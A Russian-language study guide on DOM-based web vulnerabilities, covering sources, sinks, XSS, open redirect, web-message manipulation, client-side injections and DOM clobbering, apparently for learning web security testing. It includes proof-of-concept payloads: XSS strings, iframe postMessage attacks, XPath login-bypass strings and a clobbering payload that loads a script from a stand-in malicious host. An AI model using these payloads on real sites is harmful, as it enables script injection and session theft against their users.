* [Приемники, которые могут привести к уязвимостям](#Приемники,которые-могут-привести-к-уязвимостям)
   * [Распространенные источники](#Распространенные-источники)
   * [Приёмники которые могут привести к уязвимостям DOM-XSS](#Приёмники-которые-могут-привести-к-уязвимостям-DOM-XSS)
      * [Функции jQuery которые являются приемниками и могут привести к уязвимостям DOM-XSS](#Функции-jQuery-которые-являются-приемниками-и-могут-привести-к-уязвимостям-DOM-XSS)
* [XSS-атака на основе DOM](#XSS-атака-на-основе-DOM)
   * [Эксплуатация DOM XSS](#Эксплуатация-DOM-XSS)
      * [Источники и приемники в сторонних зависимостях](#Источники-и-приемники-в-сторонних-зависимостях)
          * Библиотека jQuery
          * DOM XSS в AngularJS Фреймворк
          * DOM XSS в сочетании с отражёнными и сохранёнными данными
* [Открытое перенаправление на основе DOM](#Открытое-перенаправлениена-основе-DOM)
* [Манипулирование файлами cookie на основе DOM](#Манипулирование-файлами-cookie-на-основе-DOM)
* [Внедрение JavaScript в DOM](#Внедрение-JavaScript-в-DOM)
* [Манипулирование доменом документа на основе DOM ](#Манипулирование-доменом-документа-на-основе-DOM)
* [Отравление URL-адресов WebSocket на основе DOM](#Отравление-URL-адресов-WebSocket-на-основе-DOM)
* [Манипулирование веб-сообщениями](#Манипулирование-веб-сообщениями)
* [Манипулирование заголовками Ajax-запросов на основе DOM](#Манипулирование-заголовками-Ajax-запросов-на-основе-DOM)
* [Манипулирование локальными путями к файлам на основе DOM](#Манипулирование-локальными-путями-к-файлам-на-основе-DOM)
* [Клиентская SQL-инъекция в DOM](#Клиентская-SQL-инъекция-в-DOM)
* [Манипулирование хранилищем HTML5 на основе DOM](#Манипулирование-хранилищем-HTML5-на-основе-DOM)
* [Клиентская XPath-инъекция на основе DOM](#Клиентская-XPath-инъекция-на-основе-DOM)
* [Клиентская JSON-инъекция в DOM ](#Клиентская-JSON-инъекция-в-DOM)
* [Манипулирование DOM-данными](#Манипулирование-DOM-данными)
* [Отказ в обслуживании на основе DOM](#Отказ-в-обслуживании-на-основе-DOM)
* [DOM-clobbering](#DOM-clobbering)
    * [Массивы и атрибуты](#Массивы-и-атрибуты)
    * [window.someObject](#windowsomeObject)
* [Защита](#Защита)
* [URL](#URL)

> Объектная модель документа (DOM) — это иерархическое представление элементов страницы в веб-браузере. Веб-сайты могут использовать JavaScript для управления узлами и объектами DOM, а также их свойствами. Уязвимости, связанные с DOM, возникают, когда веб-сайт содержит JavaScript, который принимает контролируемое злоумышленником значение, известное как источник, и передаёт его в опасную функцию, известную как приемник.

* Источник и приёмник
  * Источник — это свойство JavaScript, принимающее данные. Примером источника является свойство location.search, поскольку оно считывает входные данные из строки запроса.
  * Приёмник — это потенциально опасная функция JavaScript или объект DOM, которые могут вызвать нежелательные последствия при передаче данных. Например, функция eval() является приёмником, поскольку она обрабатывает переданный ей аргумент как JavaScript.
 
# Приемники, которые могут привести к уязвимостям:

|Уязвимость|Приемник|
|--------------------|--------------------|
|DOM XSS|  document.write()|
|Открытое перенаправление  |window.location|
|Манипуляция с файлами cookie|  document.cookie|
|Внедрение JavaScript| eval()|
|Манипуляция с доменом документа| document.domain|
|Отравление URL WebSocket| WebSocket()|
|Манипуляция со ссылкой |element.src|
|Манипуляция с веб-сообщением| postMessage()|
|Манипуляция с заголовком Ajax-запроса| setRequestHeader()|
|Манипуляция с локальным путём к файлу |FileReader.readAsText()|
|Клиентская SQL-инъекция| ExecuteSql()|
|Манипуляция с хранилищем HTML5| sessionStorage.setItem()|
|Внедрение XPath на стороне Клиент |document.evaluate()|
|Внедрение JSON на стороне клиента |JSON.parse()|
|Манипуляция данными DOM |element.setAttribute()|
|Отказ в обслуживании |RegExp()|

## **Распространенные источники**

| Источник | Тип | Описание |
|----------|-----|----------|
| **URL и навигация** | | |
| `document.URL` | Свойство | Полный URL страницы (кодированный) |
| `document.documentURI` | Свойство | URI документа (альтернатива URL) |
| `document.URLUnencoded` | Свойство | Некодированный URL (устаревший) |
| `document.baseURI` | Свойство | Базовый URI для относительных путей |
| `location` | Объект | Объект с информацией о текущем URL |
| **Хранение данных** | | |
| `document.cookie` | Свойство | Куки сайта (строка ключ=значение) |
| `document.referrer` | Свойство | URL страницы-источника перехода |
| `window.name` | Свойство | Имя окна (сохраняется между перезагрузками) |
| **History API** | | |
| `history.pushState()` | Метод | Добавляет запись в историю без перезагрузки |
| `history.replaceState()` | Метод | Заменяет текущую запись в истории |
| **Хранилища браузера** | | |
| `localStorage` | Объект | Постоянное хранилище (до 5-10MB) |
| `sessionStorage` | Объект | Временное хранилище (только сессия) |
| `IndexedDB` | Объект | NoSQL база данных в браузере |
| `Database` | Объект | Устаревшая WebSQL база данных |

## **Приёмники которые могут привести к уязвимостям DOM-XSS**

| Приемник | Тип | Описание | 
|----------|-----|----------|
| **Запись в документ** | | | 
| `document.write()` | Метод | Записывает HTML прямо в документ |
| `document.writeln()` | Метод | Аналог write() с добавлением перевода строки | 
| **Домен документа** | | | 
| `document.domain` | Свойство | Устанавливает домен документа (для same-origin policy) | 
| **Манипуляция DOM** | | | 
| `element.innerHTML` | Свойство | Устанавливает/получает HTML содержимое элемента |
| `element.outerHTML` | Свойство | Устанавливает/получает HTML включая сам элемент |
| `element.insertAdjacentHTML()` | Метод | Вставляет HTML в указанную позицию относительно элемента |
| **Обработчики событий** | | | 
| `element.onevent` | Свойство | Обработчики событий (onclick, onload и т.д.) | 

### Функции jQuery которые являются приемниками и могут привести к уязвимостям DOM-XSS

| Функция | Тип | Описание |
|---------|-----|----------|
| **Добавление контента** | | | 
| `add()` | Метод | Добавляет элементы в набор выбранных элементов | 
| `after()` | Метод | Вставляет контент после выбранных элементов | 
| `append()` | Метод | Добавляет контент в конец выбранных элементов | 
| `insertAfter()` | Метод | Вставляет элементы после целевого элемента |
| `insertBefore()` | Метод | Вставляет элементы перед целевым элементом | 
| `before()` | Метод | Вставляет контент перед выбранными элементами |
| `prepend()` | Метод | Добавляет контент в начало выбранных элементов | 
| **Замена и обертка** | | | 
| `replaceAll()` | Метод | Заменяет целевые элементы выбранными элементами | 
| `replaceWith()` | Метод | Заменяет выбранные элементы новым контентом |
| `wrap()` | Метод | Оборачивает каждый выбранный элемент в указанный HTML | 
| `wrapInner()` | Метод | Оборачивает содержимое каждого выбранного элемента |
| `wrapAll()` | Метод | Оборачивает все выбранные элементы в указанный HTML | 
| **Внутренние функции** | | | 
| `html()` | Метод | Устанавливает/получает HTML содержимое элементов | 
| `has()` | Метод | Фильтрует элементы, содержащие определенные потомки | 
| `constructor()` | Метод | Конструктор jQuery объектов | 
| `init()` | Метод | Инициализация jQuery объекта | 
| `index()` | Метод | Возвращает индекс элемента в наборе |
| **Парсинг HTML** | | | 
| `jQuery.parseHTML()` | Метод | Парсит строку в массив DOM узлов | 
| `$.parseHTML()` | Метод | Сокращенная версия parseHTML() | 
| `animate()` | Метод | Анимирует CSS свойства элементов | 

# XSS-атака на основе DOM

> Наиболее распространённым источником DOM XSS является URL-адрес, доступ к которому обычно осуществляется с помощью объекта window.location.

* **Методология**
  * *Тестирование HTML-приёмников*
    * Поместить в источник случайную буквенно-цифровую строку (например, location.search),
    * С помощью инструментов разработчика проанализируйте HTML-код и найдите место появления нужной строки. (В инструментах разработчика использовать Control+F для поиска нужной строки в DOM.)
    * Для каждого места определить контекст. (Если строка находится в атрибуте, заключённом в двойные кавычки, добавить двойные кавычки в строку, чтобы проверить, можно ли выйти за пределы атрибута.)
    * Если ваши данные были закодированы в URL до обработки, XSS-атака вряд ли сработает.
  * *Тестирование приёмников выполнения JavaScript*
    * Для каждого потенциального источника, например, location, сначала необходимо найти в JavaScript-коде страницы случаи, когда на него ссылаются. (инструментах разработчика + Control+Shift+F )
    * Использовать отладчик JavaScript, чтобы добавить точку останова и проследить, как используется значение источника.
    * Обнаружив приемник, которому назначаются данные, полученные из источника, использовать отладчик для проверки значения. (наведя курсор на переменную, чтобы увидеть её значение перед отправкой в ​​приемник.)
  * * **Тестирование на DOM XSS с помощью DOM Invader**
   
##  Эксплуатация DOM XSS

* **source location.search -> приёмник document.write**
```
<script>alert(document.domain)</script>
product?productId=1&storeId=London%27><script>alert("XXX")</script>
```
* **Приёмник innerHTML не принимает элементы скрипта**
```
<img src=1 onerror=alert(document.domain)>
```

### **Источники и приемники в сторонних зависимостях**

* **Библиотека jQuery**
> функция attr() - может изменять атрибуты элементов DOM.
```
//Изменяет атрибут href элемента привязки, используя данные из URL-адреса
$(function() {
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});

?returnUrl=javascript:alert(document.domain)
```
> селекторная функция $() - может использоваться для внедрения вредоносных объектов в DOM. Служит для выбора элементов HTML-документа по заданным критериям (селекторам)
> 
> location.hash - для анимации или автоматической прокрутки к определённому элементу на странице + обработчик событий hashchange
```
$(window).on('hashchange', function() {
var element = $(location.hash);
element[0].scrollIntoView();
});

#
#" onload="this.src+='<img src=1 onerror=alert(1)>'">
<iframe src="https://victimsite.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
<iframe src="https://victimsite.com#.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

* **DOM XSS в AngularJS Фреймворк**
  
> ng-app — это специальный атрибут AngularJS, который указывает корневой элемент приложения.
1. ng-app — точка входа для AngularJS
2. Без него AngularJS не активируется
3. Определяет область действия приложения
```
<!-- На всем документе -->
<html ng-app="myApp">

<!-- На конкретном элементе -->
<div ng-app="myApp">

<!-- Несколько приложений (в разных версиях) -->
<div ng-app="app1">...</div>
<div ng-app="app2">...</div>
```
```
class="ng-binding"
{{$on.constructor('alert(1)')()}}
```

* **DOM XSS в сочетании с отражёнными и сохранёнными данными**
  
> Встроенная функция eval() позволяет выполнять строку кода.
> 
> Источники не ограничиваются данными, которые напрямую предоставляются браузерами — они также могут исходить с веб-сайта. Веб-сайты часто отражают параметры URL в HTML-ответе сервера.
```
\\
Отправляет GET-запрос по указанному пути с параметрами из URL
Ожидает JSON-ответ с результатами поиска
\\
var xhr = new XMLHttpRequest();
xhr.open("GET", path + window.location.search);
xhr.send();

xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};

\\ payload
/search-results?search=\"alert(1)}//
```
* При XSS в DOM сервер получает данные из одного запроса, сохраняет их, а затем включает в следующий ответ. Скрипт в ответе содержит приёмник, который затем обрабатывает данные небезопасным способом.
```element.innerHTML = comment.author```
> Без флага g метод replace() заменяет только первое совпадение.
```
html.replace('<', '&lt;').replace('>', '&gt;');

<><img src=1 onerror=alert(1)>
```

# Открытое перенаправление на основе DOM
> Уязвимости открытого перенаправления на основе DOM возникают, когда скрипт записывает контролируемые данные в приемник, что может привести к кросс-доменной навигации.

| Приемник | Тип | Описание | 
|----------|-----|----------|
| **Объект location** | | | 
| `location` | Объект | Объект для работы с URL страницы | 
| `location.host` | Свойство | Устанавливает хост и порт | 
| `location.hostname` | Свойство | Устанавливает имя хоста | 
| `location.href` | Свойство | Устанавливает полный URL | 
| `location.pathname` | Свойство | Устанавливает путь URL |
| `location.search` | Свойство | Устанавливает параметры URL |
| `location.protocol` | Свойство | Устанавливает протокол URL |
| `location.assign()` | Метод | Переходит по указанному URL | 
| `location.replace()` | Метод | Заменяет текущую страницу | 
| **Методы окон** | | | 
| `open()` | Метод | Открывает новое окно/вкладку |
| **DOM элементы** | | | 
| `element.srcdoc` | Свойство | Устанавливает HTML содержимое для iframe | 
| **AJAX запросы** | | |
| `XMLHttpRequest.open()` | Метод | Открывает AJAX запрос |
| `XMLHttpRequest.send()` | Метод | Отправляет AJAX запрос |
| `jQuery.ajax()` | Метод | jQuery AJAX запрос | 
| `$.ajax()` | Метод | Сокращенная версия jQuery AJAX |
| **jQuery манипуляции** | | | 
| `add()` | Метод | Добавляет элементы (риск через обработчики) |

[URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

# Манипулирование файлами cookie на основе DOM

Если сайт небезопасно отображает значения из cookie-файлов без их HTML-кодирования, можно использовать методы манипулирования cookie-файлами для эксплуатации этого поведения.

```
<iframe src="https://victimsite.net/product?productId=4&'><script>alert(XSS)</script>" onload="if(!window.x)this.src='https://victimsite.net/';window.x=1;">

// <iframe> (Inline Frame) - это HTML-элемент, который позволяет встраивать целую веб-страницу внутри другой веб-страницы.
// onclick - при клике
// onload - при завершении загрузки
// onerror - при ошибке
// window - глобальный объект, представляющий окно браузера.
// Проверка условия
if (!window.x) {  // window.x === undefined → true
    
    // Меняем URL на легитимный
    this.src = 'https://site.com';
    
    // Устанавливаем флаг
    window.x = 1;  // Предотвращает повторение
}
```

* **Потенциальное воздействие этой уязвимости**
  * Если cookie-файл используется для управления поведением, возникающим в результате определенных действий пользователя (например, при выборе между рабочим и демонстрационным режимами) - выполнить непреднамеренные действия.
  * Если файл cookie используется для отслеживания сеанса пользователя - провести атаку с фиксацией сеанса, установив в качестве значения файла cookie действительный токен, полученный с веб-сайта, а затем перехватить сеанс во время последующего взаимодействия жертвы с веб-сайтом. (может быть использована для атаки на любой другой веб-сайт в том же родительском домене.)

* **Каналы**
  * document.cookie 

* **Как предотвратить**
  * Следует избегать динамической записи в файлы cookie с использованием данных, полученных из ненадежных источников.

# Внедрение JavaScript в DOM

| Приемник | Описание |
|------|-------------|
| `eval()` | Выполняет JavaScript код из строки, интерпретирует ввод как код |
| `Function()` | Конструктор создает функцию из строковых аргументов |
| `setTimeout()` | Выполняет код из строки после задержки |
| `setInterval()` | Повторно выполняет код из строки через интервалы |
| `setImmediate()` | Выполняет код из строки сразу после текущих событий (Node.js) |
| `execCommand()` | Выполняет команды редактора с HTML/текстовым вводом |
| `execScript()` | IE-специфичный метод выполнения скриптов из строк |
| `msSetImmediate()` | Microsoft вариант setImmediate для выполнения кода из строк |
| `range.createContextualFragment()` | Парсит HTML строку в фрагмент документа, выполняет скрипты |
| `crypto.generateCRMFRequest()` | Может включать скрипты в запросы сертификатов через параметры |

# Манипулирование доменом документа на основе DOM

> Возникают, когда скрипт использует контролируемые пользователем данные для установки свойства document.domain.

> Браузеры накладывают некоторые ограничения на значения, которые можно назначить свойству document.domain, и могут предотвратить использование значений, совершенно отличных от фактического источника страницы.

* Однако
  * Браузеры позволяют использовать дочерние или родительские домены
  * Некоторые особенности браузеров позволяют переключаться на совершенно не связанные домены.
 
* **Приёмники**
  * document.domain
    
* **Как предотвратить**
  * Избегать динамического изменения свойства document.domain данными из любых ненадёжных источников.
 
# Отравление URL-адресов WebSocket на основе DOM

> Уязвимость для создания URL-адреса, который при посещении другим пользователем заставит браузер пользователя открыть соединение WebSocket с URL-адресом, находящимся под контролем злоумышленника.
* Если веб-сайт передаёт конфиденциальные данные из браузера пользователя на сервер WebSocket - перехватить эти данные.
* Если приложение считывает данные с сервера WebSocket и обрабатывает их каким-либо образом - нарушить логику веб-сайта или осуществлять атаки на пользователя на стороне клиента.

* **Приёмники**
  * WebSocket
* **Как предотвратить**
  * Следует избегать динамического задания целевого URL-адреса соединения WebSocket данными из любых ненадёжных источников.
 
# Манипулирование ссылками на основе DOM
> Возникают, когда скрипт записывает контролируемые данные в целевой элемент навигации на текущей странице, например, в кликабельную ссылку или URL-адрес формы отправки.

* **Последствия**
  * Фишинг
  * Отправка конфиденциальных данных формы на контролируемый сервер. 
  * Выполнение пользователем непреднамеренного действия в приложении.
  * Обход защиты браузера от XSS путем внедрения внутренних ссылок, содержащих эксплойты XSS. (Защита от XSS обычно не учитывает внутренние ссылки.)
   
* **Каналы**
  * element.href
  * element.src
  * element.action
  
* **Как предотвратить**
  * Избегать использования данных из любых ненадежных источников для динамической установки целевого URL-адреса для ссылок или форм.

# Манипулирование веб-сообщениями

> Если страница обрабатывает входящие веб-сообщения небезопасным образом, некорректно проверяя источник входящих сообщений в прослушивателе событий, свойства и функции, вызываемые прослушивателем событий, потенциально могут стать приёмниками.

```
<script>
window.addEventListener('message', function(e) {
eval(e.data);
});
</script>
//addEventListener	- Регистрация обработчика событий
//element.addEventListener(eventType, handlerFunction, options);
//прослушиватель событий не проверяет источник сообщения, а метод postMessage() указывает targetOrigin "*"

Payloads:
<iframe src="https://victimsite.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
<iframe src="https://victimsite.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```

* **Проверка источника**

```
window.addEventListener('message', function(e) {
if (e.origin.indexOf('normal-website.com') > -1) {
eval(e.data);
}
});
//Метод indexOf используется для проверки того, что источником входящего сообщения является домен normal-website.com.(он проверяет только наличие строки "normal-website.com")
```

```
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), 
        ACMEplayer = {element: iframe}, 
        d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);

// Отправка команды:
window.postMessage(JSON.stringify({
    type: "load-channel",
    url: "https://video-provider.com/stream/123"
}), '*');

Payload:
<iframe src=https://victimsite.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

```

* **Приемники**
  * Из-за отсутствия адекватной проверки источника, любые приемники, используемые прослушивателем событий входящих сообщений, потенциально могут привести к уязвимостям.

# Манипулирование заголовками Ajax-запросов на основе DOM

> Возникают, когда скрипт записывает контролируемые данные в заголовок Ajax-запроса, отправляемого с использованием объекта XmlHttpRequest.
> 
> Использование Ajax позволяет веб-сайту отправлять асинхронные запросы к серверу, что позволяет веб-приложениям динамически изменять содержимое страницы без необходимости её перезагрузки.

* Базовый AJAX запрос
1. JavaScript создает XMLHttpRequest объект
2. Настраивает параметры запроса (URL, метод, headers)
3. Отправляет запрос на сервер
4. Сервер обрабатывает запрос
5. JavaScript получает ответ и обновляет страницу

* **Каналы**

| Канал | Описание |
|---------|-------------|
| `XMLHttpRequest.setRequestHeader()` | Устанавливает HTTP заголовки для AJAX запроса перед отправкой |
| `XMLHttpRequest.open()` | Инициализирует AJAX запрос с указанием метода, URL и параметров |
| `XMLHttpRequest.send()` | Отправляет подготовленный AJAX запрос на сервер |
| `jQuery.globalEval()` | Выполняет JavaScript код в глобальной области видимости (jQuery) |
| `$.globalEval()` | Алиас для jQuery.globalEval(), выполняет код в глобальном контексте |


# Манипулирование локальными путями к файлам на основе DOM

> Возникают, когда скрипт передает контролируемые злоумышленником данные в API обработки файлов в качестве параметра имени файла. Можно использовать для создания URL-адреса, который при посещении другим пользователем приведет к открытию произвольного локального файла в браузере.

* Приемники

| Метод | Краткое описание |
|-------|------------------|
| `FileReader.readAsArrayBuffer()` | Читает файл как ArrayBuffer для бинарных данных |
| `FileReader.readAsBinaryString()` | Читает файл как бинарную строку (устаревший) |
| `FileReader.readAsDataURL()` | Читает файл как data: URL строку (base64) |
| `FileReader.readAsText()` | Читает файл как текстовую строку с указанием кодировки |

# Клиентская SQL-инъекция в DOM

> Возникает, когда скрипт небезопасным образом включает контролируемые пользователем данные в клиентский SQL-запрос. (создаст URL-адрес, который при посещении другим пользователем выполнит произвольный SQL-запрос в локальной базе данных SQL браузера пользователя.)

* **Приемники**

* executeSql() — это функция для выполнения SQL-запросов прямо в браузере через Web SQL Database.
    *  Web SQL устарел, сейчас используется IndexedDB, но принцип похож - выполнение операций с базой данных прямо в браузере.
        * Вместо одного метода executeSql() в IndexedDB используется набор методов JS для каждой операции (add(), get(), put(), delete(), openCursor()).
     
# Манипулирование хранилищем HTML5 на основе DOM

> Возникает, когда скрипт сохраняет контролируемые злоумышленником данные в хранилище HTML5 веб-браузера (localStorage или sessionStorage).
>> Само по себе такое поведение не является уязвимостью безопасности. Однако, если приложение впоследствии считывает данные из хранилища и обрабатывает их небезопасным способом, можно использовать механизм хранилища для осуществления других атак на основе DOM, таких как межсайтовый скриптинг и внедрение JavaScript. 

| Метод | Принцип работы | Пример использования |
|-------|----------------|----------------------|
| `sessionStorage.setItem()` | Сохраняет данные только на время текущей сессии (закрытие вкладки → удаление данных). Изолирован для каждой вкладки. | `sessionStorage.setItem('formData', JSON.stringify({name: 'John'}));` |
| `localStorage.setItem()` | Сохраняет данные постоянно до явного удаления. Данные доступны во всех вкладках одного домена. | `localStorage.setItem('theme', 'dark'); localStorage.setItem('user', JSON.stringify({id: 1}));` |

|Тип|Объем|	Время жизни|Доступ|	Использование|
|---------|------|--------|--------|----------|
|Cookies|	4KB|	Устанавливается	Авто|	Сессии, авторизация|
|Local Storage	|5-10MB|	Постоянно	|JavaScript	|Настройки, кэш|
|Session Storage|5-10MB|	До закрытия вкладки|	JavaScript|	Временные данные|
|IndexedDB	|До 50% диска	|Постоянно	|JavaScript|Большие данные|
|Cache Storage|	Зависит от браузера|	Постоянно|	Service Worker|	Файлы, ресурсы|

# Клиентская XPath-инъекция на основе DOM

> Возникает, когда скрипт включает контролируемые пользователем данные в XPath-запрос. Можно использовать это поведение для создания URL-адреса, который при посещении другим пользователем приложения инициирует выполнение произвольного XPath-запроса, что может привести к извлечению и обработке веб-сайтом других данных.
>> XPath (XML Path Language) — это язык запросов для навигации по XML-документам и выборки данных из них.

```
//user[@id='1']                     - найти пользователя с id=1
//book[price>20]/title              - найти заголовки книг дороже 20
/user[username='admin' and password='123'] - найти пользователя по логину и паролю

Обход аутентификации (' or '1'='1)
Чтение всего XML (' | //* | ')
```

| Метод | Принцип работы | Возвращаемый результат | Пример использования |
|-------|----------------|------------------------|----------------------|
| `document.evaluate()` | Выполняет XPath-запрос по всему DOM-дереву документа. Возвращает XPathResult объект для итерации по найденным узлам. | XPathResult объект | `let result = document.evaluate("//p[@class='text']", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);` |
| `element.evaluate()` | Выполняет XPath-запрос в контексте конкретного DOM-элемента (и его потомков). Удобно для поиска внутри ограниченной области страницы. | XPathResult объект | `let result = element.evaluate(".//span[contains(@class, 'highlight')]", element, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);` |

# Клиентская JSON-инъекция в DOM

> JSON-инъекция в DOM — это уязвимость безопасности, которая возникает когда недоверенные JSON-данные неправильно обрабатываются на клиентской стороне и попадают в DOM без должной санитизации.

```
{
  "name": "Атакующий",
  "bio": "<img src=x onerror=stealCookies()>",
  "avatar": "javascript:alert('XSS')"
}

1. XSS через строковые поля
json
{
  "title": "Новость</title><script>malicious()</script>",
  "content": "<iframe src=evil.com>"
}

2. Инъекция в атрибуты
json
{
  "link": "javascript:alert(1)",
  "image": "\" onload=\"alert(1)"
}

3. JSONP-инъекция
javascript
callbackFunction({"data": "value"}); alert(1); //
```

* **Каналы**
  
| Метод | Принцип работы | 
|-------|----------------|
| `JSON.parse()` | Нативный метод JavaScript для преобразования JSON-строки в JavaScript-объект. Выполняет синтаксический разбор и валидацию. | 
| `jQuery.parseJSON()` | Метод jQuery для парсинга JSON-строк. Внутренне использует нативный JSON.parse() если доступен, иначе fallback-реализацию. | 
| `$.parseJSON()` | Псевдоним для jQuery.parseJSON(). Точно такой же функционал, просто более короткая запись через jQuery-объект. | 

* **Последствия**
    * В зависимости от цели использования этих данных пользователь может нарушить логику веб-сайта или вызвать непреднамеренные действия от имени другого пользователя.
 
# Манипулирование DOM-данными

> Возникает, когда скрипт записывает контролируемые пользователем данные в поле DOM, используемое в видимом пользовательском интерфейсе или клиентской логике.
>> Уязвимости, связанные с манипулированием DOM-данными, могут быть использованы как для отраженных, так и для сохраненных атак на DOM.

* **Последствия**
  * Искажения веб-сайта, например, для изменения текста или изображений, отображаемых на определенной странице.  
  * Если возможно изменить свойство src элемента, он потенциально может спровоцировать пользователя на выполнение непреднамеренных действий, импортировав вредоносный файл JavaScript.

| Метод/Свойство | Принцип работы | Возвращаемый результат | Особенности |
|----------------|----------------|------------------------|-------------|
| `script.src` | Указывает URL внешнего JavaScript файла для загрузки | Строка с URL | При изменении динамически загружает скрипт |
| `script.text` | Содержит текст inline-скрипта (код между тегами `<script>`) | Строка с кодом | Только для inline скриптов |
| `script.textContent` | Альтернатива `script.text` для получения текста скрипта | Строка с кодом | Аналогично `script.text` |
| `script.innerText` | Не рекомендуется для скриптов | Строка | Лучше использовать `textContent` |
| `element.setAttribute()` | Устанавливает значение атрибута элемента | undefined | `element.setAttribute('id', 'test')` |
| `element.search` | Свойство для `<input type="search">` - значение поиска | Строка | Только для search inputs |
| `element.text` | Нестандартное свойство, аналогичное textContent | Строка | Лучше использовать `textContent` |
| `element.textContent` | Возвращает весь текстовый контент элемента и его потомков | Строка | Игнорирует скрытые элементы |
| `element.innerText` | Возвращает видимый текстовый контент элемента | Строка | Учитывает CSS стили и видимость |
| `element.outerText` | Заменяет весь элемент текстом (деструктивное) | Строка | Редко используется |
| `element.value` | Значение форм-элементов (input, select, textarea) | Строка/число | Зависит от типа элемента |
| `element.name` | Имя элемента формы или атрибут name | Строка | Используется при отправке форм |
| `element.target` | Цель для ссылок (`<a>`) и форм (`<form>`) | Строка | _blank, _self, _parent, _top |
| `element.method` | HTTP-метод для формы (`<form>`) | Строка | GET, POST, PUT, DELETE |
| `element.type` | Тип элемента (input type, button type и т.д.) | Строка | text, submit, button, checkbox |
| `element.backgroundImage` | CSS свойство background-image элемента | Строка | `url('image.jpg')` |
| `element.cssText` | Устанавливает/получает inline CSS стили элемента | Строка | `"color: red; font-size: 16px;"` |
| `element.codebase` | Устаревшее свойство для `<applet>` | Строка | Не использовать в современных приложениях |
| `document.title` | Заголовок документа (отображается во вкладке) | Строка | Изменяет title страницы |
| `document.implementation.createHTMLDocument()` | Создает новый HTML документ | HTMLDocument | Полезно для шаблонов |
| `history.pushState()` | Добавляет запись в историю браузера без перезагрузки | undefined | Для SPA навигации |
| `history.replaceState()` | Заменяет текущую запись в истории браузера | undefined | Для изменения текущего state |

* *Burp Suite автоматически выявляет эту уязвимость с помощью статического анализа кода, что может привести к ложным срабатываниям, которые фактически не являются эксплуатируемыми.*

# Отказ в обслуживании на основе DOM

> Возникают, когда скрипт небезопасным способом передаёт контролируемые пользователем данные проблемному API платформы, например, API, вызов которого может привести к чрезмерному потреблению ресурсов процессора или дискового пространства компьютером пользователя. Это может привести к побочным эффектам, если браузер ограничивает функциональность веб-сайта, например, отклоняя попытки сохранить данные в localStorage или завершая загруженные скрипты.

| Метод/Конструктор | Принцип работы | Возвращаемый результат | Особенности и использование |
|-------------------|----------------|------------------------|----------------------------|
| `requestFileSystem()` | Запрашивает доступ к sandboxed файловой системе в браузере. Позволяет веб-приложениям читать/записывать файлы. | FileSystem объект через колбэк | **Устаревший метод**. Требует разрешения пользователя. Работает только в Chrome. |
| `RegExp()` | Конструктор для создания объектов регулярных выражений. Используется для поиска и манипуляции текстом по шаблону. | RegExp объект | `new RegExp('pattern', 'flags')` или `/pattern/flags` |

# DOM-clobbering 

> Затирание DOM — это метод, при котором HTML-код внедряется в страницу для манипулирования DOM и, в конечном итоге, изменения поведения JavaScript на странице.
>> Затирание DOM особенно полезно в случаях, когда XSS-атака невозможна, но вы можете контролировать часть HTML-кода на странице
>>> Только некоторые элементы могут использовать атрибут name для затирания глобальных переменных: embed, form, iframe, image, img и object.

### Массивы и атрибуты

```
<form id="x" name="y"><input id="z" value="controlled" /></form>
<form id="x"></form>
<script>
  alert(x.y.z.value) //controlled
</script>
```

```
<form id=x tabindex=0 onfocus=print()><input id=attributes>

    <form> - это контейнер для полей ввода
    id=x - даём имя "x" этой форме (как кличка питомца)
    tabindex=0 - разрешаем фокусироваться на форме клавишей Tab
    onfocus=print() - когда форма получает фокус, выполнить команду печати
2. <input id=attributes>
    <input> - поле для ввода текста
    id=attributes - называем его "attributes"
```

> В этом случае клиентский фильтр обходит DOM и обнаруживает элемент формы, занесённый в белый список.
>> Обычно фильтр проходит по свойству attributes элемента формы и удаляет все атрибуты из чёрного списка.
>>> Поскольку свойство attributes было перекрыто элементом input, фильтр перебирает элемент input. Поскольку элемент input имеет неопределённую длину, условия цикла for фильтра (например, i<element.attributes.length)> не выполняются, и фильтр просто переходит к следующему элементу. (добавляя входные данные с id=attributes внутрь формы, фактически перезаписывается свойство attributes, не давая средству очистки доступа к фактическим атрибутам.)

```
// Шаг 1: Браузер ищет свойство 'attributes' у формы
// Шаг 2: Видит, что внутри формы есть элемент с id="attributes"
// Шаг 3: Отдает приоритет элементу над нативным свойством
// Шаг 4: Возвращает HTML-элемент вместо NamedNodeMap
```

```
const person = {
    name: "John",
    // нативное свойство
    get attributes() { return {age: 30, height: 180}; }
};

console.log(person.attributes); // {age: 30, height: 180}

// "DOM clobbering" в JavaScript
person.attributes = "I'm a string now!";
console.log(person.attributes); // "I'm a string now!" - нативный геттер перезаписан!
```

### window.someObject

* Разработчики JavaScript часто используют следующий шаблон:
    * var someObject = window.someObject || {};
```
Логика:
Если window.someObject уже существует — используем его
Иначе создаем пустой объект {}
```

* **Манипулирование HTML на странице позволяет переопределить someObject узлом DOM**
  
```
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>

Payload:
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

> Поскольку два якоря используют один и тот же идентификатор, DOM группирует их в DOM-коллекцию.
>> Вектор DOM затем перезаписывает ссылку someObject этой DOM-коллекцией.
>>> Атрибут name используется в последнем якорном элементе для затмения свойства url объекта someObject, которое указывает на внешний скрипт.

```
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
